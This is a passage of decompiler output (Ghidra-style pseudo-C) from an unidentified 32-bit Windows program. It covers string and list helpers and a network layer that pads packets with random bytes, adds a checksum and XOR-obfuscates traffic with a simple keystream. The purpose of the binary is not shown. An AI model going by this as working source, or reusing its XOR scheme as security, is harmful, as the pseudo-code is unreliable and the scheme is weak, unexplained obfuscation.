    if (in_stack_00002438 != (HWND)0x0) {
      SendMessageA(in_stack_00002438,20000,0xffffffff,0);
    }
  }
  FUN_0040dbf0((undefined4 *)register0x00000010);
LAB_0040c4cc:
  *in_FS_OFFSET = in_stack_00002400;
  return wParam;
}

undefined4 FUN_0040c4f0(void)

{
  int iVar1;
  size_t _Count;
  undefined4 uVar2;
  char **in_FS_OFFSET;
  char *in_stack_000023e0;
  char *in_stack_000023fc;
  char *in_stack_0000240c;
  undefined4 *in_stack_00002410;
  undefined4 *in_stack_00002414;
  char cVar3;
  char *pcStack12;
  undefined *puStack8;
  undefined4 local_4;
  
  pcStack12 = *in_FS_OFFSET;
  local_4 = 0xffffffff;
  puStack8 = &DAT_004142fb;
  *(char ***)in_FS_OFFSET = &pcStack12;
  FUN_00413060();
  FUN_0040dbb0(&local_4,0x1000);
  uVar2 = 0xffffffff;
  iVar1 = FUN_0040bed0(in_stack_0000240c,in_stack_00002410,0xd,&local_4);
  if (iVar1 == 0) {
    FUN_0040dd00(&local_4,in_stack_00002414);
    iVar1 = *DAT_00422210;
    FUN_0040dd40((int)&local_4);
    _Count = FUN_0040dd30((int)&local_4);
    iVar1 = (**(code **)(iVar1 + 0x18))();
    if (iVar1 < 0) {
      (**(code **)(*DAT_00422210 + 0xc))();
    }
    else {
      cVar3 = (char)((uint)&stack0xffffffe8 >> 0x18);
      iVar1 = (**(code **)(*DAT_00422210 + 0x1c))();
      if (-1 < iVar1) {
        if (cVar3 == '\a') {
          uVar2 = 0;
          if ((0x1d < (int)_Count) && ((int)_Count < 0x32)) {
            strncpy(in_stack_000023fc,&stack0x00000ff4,_Count);
            uVar2 = 1;
          }
        }
        (**(code **)(*DAT_00422210 + 0xc))();
        FUN_0040dbf0((undefined4 *)&stack0xffffffe0);
        *in_FS_OFFSET = in_stack_000023e0;
        return uVar2;
      }
      (**(code **)(*DAT_00422210 + 0xc))();
    }
  }
  FUN_0040dbf0(&local_4);
  *in_FS_OFFSET = in_stack_000023fc;
  return 0xffffffff;
}

void FUN_0040c670(void)

{
  if (DAT_00422210 != (code **)0x0) {
    (**(code **)(*DAT_00422210 + 0xc))();
    if (DAT_00422210 != (code **)0x0) {
      (**(code **)*DAT_00422210)(1);
    }
    DAT_00422210 = (code **)0x0;
  }
  return;
}

void __thiscall FUN_0040c740(void *this,int *param_1,int *param_2)

{
  char cVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = *param_2;
  *(int *)param_2[1] = *param_2;
  *(int *)(*param_2 + 4) = param_2[1];
  iVar3 = param_2[3];
  if (iVar3 != 0) {
    cVar1 = *(char *)(iVar3 + -1);
    if ((cVar1 == '\0') || (cVar1 == -1)) {
      operator_delete((char *)(iVar3 + -1));
    }
    else {
      *(char *)(iVar3 + -1) = cVar1 + -1;
    }
  }
  param_2[3] = 0;
  param_2[4] = 0;
  param_2[5] = 0;
  operator_delete(param_2);
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1;
  *param_1 = iVar2;
  return;
}

void __thiscall FUN_0040c7b0(void *this,char param_1)

{
  char cVar1;
  int iVar2;
  
  if ((param_1 != '\0') && (iVar2 = *(int *)((int)this + 4), iVar2 != 0)) {
    cVar1 = *(char *)(iVar2 + -1);
    if ((cVar1 == '\0') || (cVar1 == -1)) {
      operator_delete((char *)(iVar2 + -1));
    }
    else {
      *(char *)(iVar2 + -1) = cVar1 + -1;
    }
  }
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)((int)this + 0xc) = 0;
  return;
}

void __thiscall FUN_0040c800(void *this,void **param_1,void *param_2,undefined *param_3)

{
  void **ppvVar1;
  void **ppvVar2;
  void **ppvVar3;
  
  ppvVar3 = *(void ***)((int)param_2 + 4);
  ppvVar1 = (void **)operator_new(0x18);
  ppvVar2 = (void **)param_2;
  if (param_2 == (void *)0x0) {
    ppvVar2 = ppvVar1;
  }
  *(void ***)ppvVar1 = ppvVar2;
  if (ppvVar3 == (void **)0x0) {
    ppvVar3 = ppvVar1;
  }
  *(void ***)(ppvVar1 + 1) = ppvVar3;
  *(void ***)((int)param_2 + 4) = ppvVar1;
  *(void ***)ppvVar1[1] = ppvVar1;
  FUN_0040cad0((undefined *)(ppvVar1 + 2),param_3);
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
  *(void ***)param_1 = ppvVar1;
  return;
}

void __thiscall FUN_0040c860(void *this,int **param_1,int *param_2,int *param_3)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  
  if (param_2 == param_3) {
    *param_1 = param_2;
    return;
  }
  do {
    piVar2 = (int *)*param_2;
    *(int *)param_2[1] = *param_2;
    *(int *)(*param_2 + 4) = param_2[1];
    iVar3 = param_2[3];
    if (iVar3 != 0) {
      cVar1 = *(char *)(iVar3 + -1);
      if ((cVar1 == '\0') || (cVar1 == -1)) {
        operator_delete((char *)(iVar3 + -1));
      }
      else {
        *(char *)(iVar3 + -1) = cVar1 + -1;
      }
    }
    param_2[3] = 0;
    param_2[4] = 0;
    param_2[5] = 0;
    operator_delete(param_2);
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1;
    param_2 = piVar2;
  } while (piVar2 != param_3);
  *param_1 = piVar2;
  return;
}

void FUN_0040c8f0(void **param_1,void *param_2)

{
  void **ppvVar1;
  
  ppvVar1 = (void **)operator_new(0x18);
  if (param_1 == (void **)0x0) {
    param_1 = ppvVar1;
  }
  *(void ***)ppvVar1 = param_1;
  if (param_2 != (void *)0x0) {
    ppvVar1[1] = param_2;
    return;
  }
  *(void ***)(ppvVar1 + 1) = ppvVar1;
  return;
}

void * __thiscall FUN_0040c920(void *this,undefined4 *param_1,uint param_2)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if (0xfffffffd < param_2) {
    _Xlen();
  }
  iVar2 = *(int *)((int)this + 4);
  if (((iVar2 == 0) || (cVar1 = *(char *)(iVar2 + -1), cVar1 == '\0')) || (cVar1 == -1)) {
    if (param_2 == 0) {
      FUN_0040c7b0(this,'\x01');
      return this;
    }
    if ((*(uint *)((int)this + 0xc) < 0x20) && (param_2 <= *(uint *)((int)this + 0xc)))
    goto LAB_0040c990;
    FUN_0040c7b0(this,'\x01');
  }
  else {
    if (param_2 == 0) {
      *(char *)(iVar2 + -1) = cVar1 + -1;
      *(undefined4 *)((int)this + 4) = 0;
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)((int)this + 0xc) = 0;
      return this;
    }
  }
  FUN_0040c9c0(this,param_2);
LAB_0040c990:
  uVar3 = param_2 >> 2;
  puVar4 = *(undefined4 **)((int)this + 4);
  while (uVar3 != 0) {
    uVar3 = uVar3 - 1;
    *puVar4 = *param_1;
    param_1 = param_1 + 1;
    puVar4 = puVar4 + 1;
  }
  uVar3 = param_2 & 3;
  while (uVar3 != 0) {
    uVar3 = uVar3 - 1;
    *(undefined *)puVar4 = *(undefined *)param_1;
    param_1 = (undefined4 *)((int)param_1 + 1);
    puVar4 = (undefined4 *)((int)puVar4 + 1);
  }
  *(uint *)((int)this + 8) = param_2;
  *(undefined *)(param_2 + *(int *)((int)this + 4)) = 0;
  return this;
}

void __thiscall FUN_0040c9c0(void *this,uint param_1)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  undefined *puVar4;
  uint uVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 *in_FS_OFFSET;
  void *local_1c;
  uint local_18;
  undefined *local_14;
  undefined4 local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_00414310;
  local_10 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_10;
  local_18 = param_1 | 0x1f;
  local_14 = &stack0xffffffd8;
  if (0xfffffffd < local_18) {
    local_18 = param_1;
  }
  uVar5 = local_18;
  uVar3 = local_18 + 2;
  local_8 = 0;
  if ((int)uVar3 < 0) {
    uVar3 = 0;
  }
  local_1c = this;
  puVar4 = (undefined *)operator_new(uVar3);
  uVar3 = *(uint *)((int)this + 8);
  if (uVar3 != 0) {
    if (uVar5 < uVar3) {
      uVar3 = uVar5;
    }
    uVar5 = uVar3 >> 2;
    puVar6 = *(undefined4 **)((int)this + 4);
    puVar7 = (undefined4 *)(puVar4 + 1);
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *puVar7 = *puVar6;
      puVar6 = puVar6 + 1;
      puVar7 = puVar7 + 1;
    }
    uVar3 = uVar3 & 3;
    while (uVar5 = local_18, uVar3 != 0) {
      uVar3 = uVar3 - 1;
      *(undefined *)puVar7 = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      puVar7 = (undefined4 *)((int)puVar7 + 1);
    }
  }
  iVar2 = *(int *)((int)this + 4);
  uVar3 = *(uint *)((int)this + 8);
  if (iVar2 != 0) {
    cVar1 = *(char *)(iVar2 + -1);
    if ((cVar1 == '\0') || (cVar1 == -1)) {
      operator_delete((char *)(iVar2 + -1));
    }
    else {
      *(char *)(iVar2 + -1) = cVar1 + -1;
    }
  }
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined **)((int)this + 4) = puVar4 + 1;
  *puVar4 = 0;
  *(uint *)((int)this + 0xc) = uVar5;
  if (uVar3 <= uVar5) {
    uVar5 = uVar3;
  }
  *(uint *)((int)this + 8) = uVar5;
  *(undefined *)(*(int *)((int)this + 4) + uVar5) = 0;
  *in_FS_OFFSET = local_10;
  return;
}

undefined * Catch_0040ca19(void)

{
  uint uVar1;
  void *pvVar2;
  int unaff_EBP;
  
  *(int *)(unaff_EBP + -0x14) = *(int *)(unaff_EBP + 8);
  uVar1 = *(int *)(unaff_EBP + 8) + 2;
  if ((int)uVar1 < 0) {
    uVar1 = 0;
  }
  pvVar2 = operator_new(uVar1);
  *(void **)(unaff_EBP + 8) = pvVar2;
  return &DAT_0040ca3a;
}

// WARNING: Removing unreachable block (ram,0x0040cb20)

void __cdecl FUN_0040cad0(undefined *param_1,undefined *param_2)

{
  undefined uVar1;
  int iVar2;
  uint uVar3;
  undefined4 *puVar4;
  uint uVar5;
  int iVar6;
  undefined4 *puVar7;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00414331;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  local_4 = 0;
  if (param_1 != (undefined *)0x0) {
    uVar1 = *param_2;
    *(undefined4 *)(param_1 + 4) = 0;
    *param_1 = uVar1;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0xc) = 0;
    uVar3 = *(uint *)(param_2 + 8);
    if (param_1 == param_2) {
      if (uVar3 != 0) {
        _Xran();
      }
      FUN_0040cd80(param_1);
      iVar2 = *(int *)(param_1 + 8) - uVar3;
      iVar6 = -1;
      if (iVar2 != -1) {
        iVar6 = iVar2;
      }
      if (iVar6 != 0) {
        memmove((void *)(uVar3 + *(int *)(param_1 + 4)),
                (void *)((int)(void *)(uVar3 + *(int *)(param_1 + 4)) + iVar6),iVar2 - iVar6);
        iVar2 = *(int *)(param_1 + 8);
        uVar3 = FUN_0040cc60(param_1,iVar2 - iVar6,'\0');
        if ((char)uVar3 != '\0') {
          FUN_0040cc40(param_1,iVar2 - iVar6);
        }
      }
      FUN_0040cd80(param_1);
      *in_FS_OFFSET = local_c;
      return;
    }
    if (uVar3 != 0) {
      puVar4 = *(undefined4 **)(param_2 + 4);
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = &DAT_0041ba38;
      }
      if (*(byte *)((int)puVar4 + -1) < 0xfe) {
        FUN_0040c7b0(param_1,'\x01');
        puVar4 = *(undefined4 **)(param_2 + 4);
        if (puVar4 == (undefined4 *)0x0) {
          puVar4 = &DAT_0041ba38;
        }
        *(undefined4 **)(param_1 + 4) = puVar4;
        *(undefined4 *)(param_1 + 8) = *(undefined4 *)(param_2 + 8);
        *(undefined4 *)(param_1 + 0xc) = *(undefined4 *)(param_2 + 0xc);
        *(char *)((int)puVar4 + -1) = *(char *)((int)puVar4 + -1) + '\x01';
        *in_FS_OFFSET = local_c;
        return;
      }
    }
    uVar5 = FUN_0040cc60(param_1,uVar3,'\x01');
    if ((char)uVar5 != '\0') {
      puVar4 = *(undefined4 **)(param_2 + 4);
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = &DAT_0041ba38;
      }
      uVar5 = uVar3 >> 2;
      puVar7 = *(undefined4 **)(param_1 + 4);
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        *puVar7 = *puVar4;
        puVar4 = puVar4 + 1;
        puVar7 = puVar7 + 1;
      }
      uVar5 = uVar3 & 3;
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        *(undefined *)puVar7 = *(undefined *)puVar4;
        puVar4 = (undefined4 *)((int)puVar4 + 1);
        puVar7 = (undefined4 *)((int)puVar7 + 1);
      }
      *(uint *)(param_1 + 8) = uVar3;
      *(undefined *)(*(int *)(param_1 + 4) + uVar3) = 0;
    }
  }
  *in_FS_OFFSET = local_c;
  return;
}

void __thiscall FUN_0040cc40(void *this,int param_1)

{
  *(int *)((int)this + 8) = param_1;
  *(undefined *)(*(int *)((int)this + 4) + param_1) = 0;
  return;
}

uint __thiscall FUN_0040cc60(void *this,uint param_1,char param_2)

{
  char cVar1;
  uint3 uVar4;
  undefined *extraout_EAX;
  undefined *puVar2;
  undefined4 uVar3;
  
  if (0xfffffffd < param_1) {
    _Xlen();
  }
  puVar2 = *(undefined **)((int)this + 4);
  uVar4 = (uint3)((uint)puVar2 >> 8);
  if (((puVar2 == (undefined *)0x0) || (cVar1 = puVar2[-1], cVar1 == '\0')) || (cVar1 == -1)) {
    if (param_1 == 0) {
      if (param_2 == '\0') {
        if (puVar2 != (undefined *)0x0) {
          *(undefined4 *)((int)this + 8) = 0;
          *puVar2 = 0;
        }
        return (uint)uVar4 << 8;
      }
      if (puVar2 != (undefined *)0x0) {
        cVar1 = puVar2[-1];
        if ((cVar1 != '\0') && (cVar1 != -1)) {
          puVar2[-1] = cVar1 + -1;
          *(undefined4 *)((int)this + 4) = 0;
          *(undefined4 *)((int)this + 8) = 0;
          *(undefined4 *)((int)this + 0xc) = 0;
          return (uint)puVar2 & 0xffffff00;
        }
        operator_delete(puVar2 + -1);
        puVar2 = extraout_EAX;
      }
      *(undefined4 *)((int)this + 4) = 0;
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)((int)this + 0xc) = 0;
      return (uint)puVar2 & 0xffffff00;
    }
    if (param_2 != '\0') {
      if ((0x1f < *(uint *)((int)this + 0xc)) || (*(uint *)((int)this + 0xc) < param_1)) {
        if (puVar2 != (undefined *)0x0) {
          cVar1 = puVar2[-1];
          if ((cVar1 != '\0') && (cVar1 != -1)) {
            puVar2[-1] = cVar1 + -1;
            *(undefined4 *)((int)this + 4) = 0;
            *(undefined4 *)((int)this + 8) = 0;
            *(undefined4 *)((int)this + 0xc) = 0;
            uVar3 = FUN_0040c9c0(this,param_1);
            return CONCAT31((int3)((uint)uVar3 >> 8),1);
          }
          operator_delete(puVar2 + -1);
        }
        *(undefined4 *)((int)this + 4) = 0;
        *(undefined4 *)((int)this + 8) = 0;
        *(undefined4 *)((int)this + 0xc) = 0;
        uVar3 = FUN_0040c9c0(this,param_1);
        return CONCAT31((int3)((uint)uVar3 >> 8),1);
      }
      goto LAB_0040cd72;
    }
    if (param_1 <= *(uint *)((int)this + 0xc)) goto LAB_0040cd72;
  }
  else {
    if (param_1 == 0) {
      puVar2[-1] = cVar1 + -1;
      *(undefined4 *)((int)this + 4) = 0;
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)((int)this + 0xc) = 0;
      return (uint)uVar4 << 8;
    }
  }
  puVar2 = (undefined *)FUN_0040c9c0(this,param_1);
LAB_0040cd72:
  return CONCAT31((int3)((uint)puVar2 >> 8),1);
}

void __fastcall FUN_0040cd80(void *param_1)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  
  puVar5 = *(undefined4 **)((int)param_1 + 4);
  if (puVar5 == (undefined4 *)0x0) {
    return;
  }
  cVar1 = *(char *)((int)puVar5 + -1);
  if (cVar1 == '\0') {
    return;
  }
  if (cVar1 == -1) {
    return;
  }
  *(char *)((int)puVar5 + -1) = cVar1 + -1;
  uVar3 = 0xffffffff;
  *(undefined4 *)((int)param_1 + 4) = 0;
  *(undefined4 *)((int)param_1 + 8) = 0;
  *(undefined4 *)((int)param_1 + 0xc) = 0;
  puVar6 = puVar5;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *(char *)puVar6;
    puVar6 = (undefined4 *)((int)puVar6 + 1);
  } while (cVar1 != '\0');
  uVar3 = ~uVar3 - 1;
  if (0xfffffffd < uVar3) {
    _Xlen();
  }
  iVar2 = *(int *)((int)param_1 + 4);
  if (((iVar2 == 0) || (cVar1 = *(char *)(iVar2 + -1), cVar1 == '\0')) || (cVar1 == -1)) {
    if (uVar3 == 0) {
      FUN_0040c7b0(param_1,'\x01');
      return;
    }
    if ((*(uint *)((int)param_1 + 0xc) < 0x20) && (uVar3 <= *(uint *)((int)param_1 + 0xc)))
    goto LAB_0040ce27;
    FUN_0040c7b0(param_1,'\x01');
  }
  else {
    if (uVar3 == 0) {
      *(char *)(iVar2 + -1) = cVar1 + -1;
      FUN_0040c7b0(param_1,'\0');
      return;
    }
  }
  FUN_0040c9c0(param_1,uVar3);
LAB_0040ce27:
  uVar4 = uVar3 >> 2;
  puVar6 = *(undefined4 **)((int)param_1 + 4);
  while (uVar4 != 0) {
    uVar4 = uVar4 - 1;
    *puVar6 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar6 = puVar6 + 1;
  }
  uVar4 = uVar3 & 3;
  while (uVar4 != 0) {
    uVar4 = uVar4 - 1;
    *(undefined *)puVar6 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    puVar6 = (undefined4 *)((int)puVar6 + 1);
  }
  *(uint *)((int)param_1 + 8) = uVar3;
  *(undefined *)(uVar3 + *(int *)((int)param_1 + 4)) = 0;
  return;
}

void * __thiscall FUN_0040ce50(void *this,byte param_1)

{
  char cVar1;
  int iVar2;
  
  iVar2 = *(int *)((int)this + 4);
  if (iVar2 != 0) {
    cVar1 = *(char *)(iVar2 + -1);
    if ((cVar1 == '\0') || (cVar1 == -1)) {
      operator_delete((char *)(iVar2 + -1));
    }
    else {
      *(char *)(iVar2 + -1) = cVar1 + -1;
    }
  }
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)((int)this + 0xc) = 0;
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}

undefined4 * __fastcall FUN_0040cee0(undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  
  iVar1 = 7;
  *param_1 = 0x41ba40;
  param_1[1] = 0xffffffff;
  param_1[10] = 8;
  puVar2 = param_1 + 2;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  return param_1;
}

undefined4 * __thiscall FUN_0040cf10(void *this,byte param_1)

{
  FUN_0040cf30((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_0040cf30(undefined4 *param_1)

{
  *param_1 = 0x41ba40;
  return;
}

undefined4 __thiscall FUN_0040d0a0(void *this,undefined param_1,undefined param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  time_t tVar4;
  uint uVar5;
  undefined4 local_1f4 [7];
  undefined auStack469 [469];
  
  tVar4 = time((time_t *)0x0);
  srand((uint)tVar4);
  iVar1 = rand();
  iVar3 = 0;
  iVar1 = iVar1 % 200;
  if (0 < iVar1 + 0x1f) {
    do {
      iVar2 = rand();
      *(undefined *)((int)local_1f4 + iVar3) = (char)iVar2;
      iVar3 = iVar3 + 1;
    } while (iVar3 < iVar1 + 0x1f);
  }
  auStack469[iVar1] = param_1;
  uVar5 = 0x1f;
  auStack469[iVar1 + 1] = 0;
  auStack469[iVar1 + 2] = param_2;
  uVar5 = FUN_00412b00((ushort *)(undefined4 *)((int)local_1f4 + iVar1),uVar5);
  iVar3 = *(int *)this;
  *(short *)(auStack469 + iVar1 + 3) = (short)uVar5;
  iVar3 = (**(code **)(iVar3 + 0x18))(2,local_1f4,iVar1 + 0x24,0);
  if (iVar3 < 0) {
    return 0xffffffff;
  }
  FUN_0040d5a0(this,(undefined4 *)((int)local_1f4 + iVar1));
  return 0;
}

undefined4 __thiscall
FUN_0040d150(void *this,undefined param_1,undefined param_2,undefined param_3,int *param_4)

{
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  time_t tVar6;
  undefined4 uVar7;
  char cVar8;
  uint uVar9;
  int local_1fc;
  undefined2 local_1f4 [250];
  
  tVar6 = time((time_t *)0x0);
  srand((uint)tVar6);
  iVar2 = rand();
  iVar3 = 0;
  local_1fc = iVar2 % 200 + 0x1f;
  if (0 < local_1fc) {
    do {
      iVar2 = rand();
      *(undefined *)((int)local_1f4 + iVar3) = (char)iVar2;
      iVar3 = iVar3 + 1;
    } while (iVar3 < local_1fc);
  }
  puVar1 = (undefined4 *)(&stack0xfffffded + local_1fc);
  if (param_4 != (int *)0x0) {
    puVar4 = (undefined4 *)FUN_0040d5c0((int)param_4);
    iVar2 = 7;
    puVar5 = puVar1;
    while (iVar2 != 0) {
      iVar2 = iVar2 + -1;
      *puVar5 = *puVar4;
      puVar4 = puVar4 + 1;
      puVar5 = puVar5 + 1;
    }
    *(undefined2 *)puVar5 = *(undefined2 *)puVar4;
    *(undefined *)((int)puVar5 + 2) = *(undefined *)((int)puVar4 + 2);
  }
  *(undefined *)((int)local_1f4 + local_1fc) = param_1;
  uVar9 = 0x1f;
  *(undefined *)((int)local_1f4 + local_1fc + 1) = param_2;
  *(undefined *)((int)local_1f4 + local_1fc + 2) = param_3;
  local_1fc = local_1fc + 3;
  uVar9 = FUN_00412b00((ushort *)puVar1,uVar9);
  iVar2 = *(int *)this;
  *(undefined2 *)((int)local_1f4 + local_1fc) = (short)uVar9;
  cVar8 = (char)((uint)local_1f4 >> 0x18);
  uVar7 = 2;
  iVar2 = (**(code **)(iVar2 + 0x18))(2);
  if (-1 < iVar2) {
    FUN_0040d5a0(this,puVar1);
    iVar2 = (**(code **)(*(int *)this + 0x1c))(&stack0xfffffdfb,&stack0xfffffdfc,&stack0xfffffdf4);
    if ((-1 < iVar2) && (cVar8 == '\x02')) {
      if (param_4 != (int *)0x0) {
        iVar2 = (**(code **)(*param_4 + 0x18))(2,&stack0xfffffdf0,uVar7,1);
        if (iVar2 != 0) {
          (**(code **)(*(int *)this + 0xc))();
          return 0xffffffff;
        }
      }
      return 0;
    }
    (**(code **)(*(int *)this + 0xc))();
  }
  return 0xffffffff;
}

void __thiscall FUN_0040d2b0(void *this,int param_1,int param_2)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  
  iVar3 = 0;
  if (0 < param_2) {
    do {
      *(byte *)(iVar3 + param_1) = *(byte *)(iVar3 + param_1) ^ *(byte *)((int)this + 0x26);
      bVar1 = *(byte *)((int)this + 0x26);
      bVar2 = *(byte *)((int)this + 0x13);
      memmove((void *)((int)this + 9),(byte *)((int)this + 8),0x1e);
      iVar3 = iVar3 + 1;
      *(byte *)((int)this + 8) = bVar1 ^ bVar2;
    } while (iVar3 < param_2);
  }
  return;
}

int __thiscall FUN_0040d300(void *this,undefined4 *param_1,uint param_2,char param_3,char param_4)

{
  bool bVar1;
  char cVar2;
  int iVar3;
  uint uVar4;
  undefined4 *_Memory;
  undefined4 *puVar5;
  int iVar6;
  undefined4 *puVar7;
  int local_40c;
  int local_408;
  int local_404;
  undefined4 local_400 [256];
  
  local_408 = 0;
  if (param_2 == 0) {
    return 0;
  }
  cVar2 = FUN_0040d5d0((int)this);
  if (cVar2 == '\0') {
    return -1;
  }
  _Memory = param_1;
  if (param_3 != '\0') {
    if (param_4 == '\0') {
      FUN_0040d2b0(this,(int)param_1,param_2);
    }
    else {
      if ((int)param_2 < 0x401) {
        uVar4 = param_2 >> 2;
        puVar5 = local_400;
        while (uVar4 != 0) {
          uVar4 = uVar4 - 1;
          *puVar5 = *_Memory;
          _Memory = _Memory + 1;
          puVar5 = puVar5 + 1;
        }
        uVar4 = param_2 & 3;
        while (uVar4 != 0) {
          uVar4 = uVar4 - 1;
          *(undefined *)puVar5 = *(undefined *)_Memory;
          _Memory = (undefined4 *)((int)_Memory + 1);
          puVar5 = (undefined4 *)((int)puVar5 + 1);
        }
        FUN_0040d2b0(this,(int)local_400,param_2);
        _Memory = local_400;
      }
      else {
        _Memory = (undefined4 *)FUN_00412a90(param_2);
        if (_Memory == (undefined4 *)0x0) {
          return 0;
        }
        uVar4 = param_2 >> 2;
        puVar5 = param_1;
        puVar7 = _Memory;
        while (uVar4 != 0) {
          uVar4 = uVar4 - 1;
          *puVar7 = *puVar5;
          puVar5 = puVar5 + 1;
          puVar7 = puVar7 + 1;
        }
        uVar4 = param_2 & 3;
        while (uVar4 != 0) {
          uVar4 = uVar4 - 1;
          *(undefined *)puVar7 = *(undefined *)puVar5;
          puVar5 = (undefined4 *)((int)puVar5 + 1);
          puVar7 = (undefined4 *)((int)puVar7 + 1);
        }
        FUN_0040d2b0(this,(int)_Memory,param_2);
      }
    }
  }
  time((time_t *)&local_404);
  iVar6 = 0;
  local_40c = local_404;
  if (0 < (int)param_2) {
    while (local_40c - local_404 <= *(int *)((int)this + 0x28)) {
      iVar3 = (**(code **)(*(int *)this + 0x20))
                        (*(undefined4 *)((int)this + 4),(int)_Memory + iVar6,param_2 - iVar6);
      if (iVar3 < 1) {
        if ((iVar3 == 0) || (iVar3 = (**(code **)(*(int *)this + 0x28))(), iVar3 != 0x2733)) break;
        iVar3 = local_408 + 1;
        bVar1 = 100 < local_408;
        local_408 = iVar3;
        if (bVar1) {
          Sleep(100);
          local_408 = 0;
        }
      }
      else {
        iVar6 = iVar6 + iVar3;
      }
      time((time_t *)&local_40c);
      if ((int)param_2 <= iVar6) break;
    }
  }
  if (((_Memory != param_1) && (_Memory != local_400)) && (_Memory != (undefined4 *)0x0)) {
    free(_Memory);
  }
  return iVar6;
}

int __thiscall FUN_0040d4c0(void *this,int param_1,int *param_2,char param_3)

{
  int *piVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int *local_4;
  
  piVar1 = param_2;
  if (param_2 == (int *)0x0) {
    return 0;
  }
  local_4 = (int *)this;
  cVar2 = FUN_0040d5d0((int)this);
  if (cVar2 == '\0') {
    return -1;
  }
  iVar5 = 0;
  time((time_t *)&local_4);
  param_2 = local_4;
  iVar4 = 0;
  if (0 < (int)piVar1) {
    while ((int)((int)param_2 - (int)local_4) <= *(int *)((int)this + 0x28)) {
      iVar3 = (**(code **)(*(int *)this + 0x24))
                        (*(undefined4 *)((int)this + 4),iVar5 + param_1,(int *)((int)piVar1 - iVar5)
                        );
      if (iVar3 < 1) {
        if ((iVar3 == 0) || (iVar3 = (**(code **)(*(int *)this + 0x28))(), iVar3 != 0x2733)) break;
        iVar3 = iVar4 + 1;
        if (100 < iVar4) {
          Sleep(100);
          iVar3 = 0;
        }
      }
      else {
        iVar5 = iVar5 + iVar3;
        iVar3 = iVar4;
      }
      time((time_t *)&param_2);
      iVar4 = iVar3;
      if ((int)piVar1 <= iVar5) break;
    }
  }
  if (param_3 != '\0') {
    FUN_0040d2b0(this,param_1,iVar5);
  }
  return iVar5;
}

void __thiscall FUN_0040d5a0(void *this,undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  
  iVar1 = 7;
  puVar2 = (undefined4 *)((int)this + 8);
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar2 = *param_1;
    param_1 = param_1 + 1;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = *(undefined2 *)param_1;
  *(undefined *)((int)puVar2 + 2) = *(undefined *)((int)param_1 + 2);
  return;
}

int __fastcall FUN_0040d5c0(int param_1)

{
  return param_1 + 8;
}

undefined __fastcall FUN_0040d5d0(int param_1)

{
  return *(undefined *)(param_1 + 0x27);
}

undefined4 * __fastcall FUN_0040d5e0(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00414348;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  FUN_0040cee0(param_1);
  local_4 = 0;
  *param_1 = 0x41ba6c;
  param_1[1] = 0xffffffff;
  FUN_0040dad0((int)param_1);
  *in_FS_OFFSET = local_c;
  return param_1;
}

undefined4 * __thiscall FUN_0040d630(void *this,byte param_1)

{
  FUN_0040d650((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_0040d650(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00414368;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x41ba6c;
  local_4 = 0;
  FUN_0040dad0((int)param_1);
  FUN_0040cf30(param_1);
  *in_FS_OFFSET = local_c;
  return;
}

// WARNING: Could not reconcile some variable overlaps

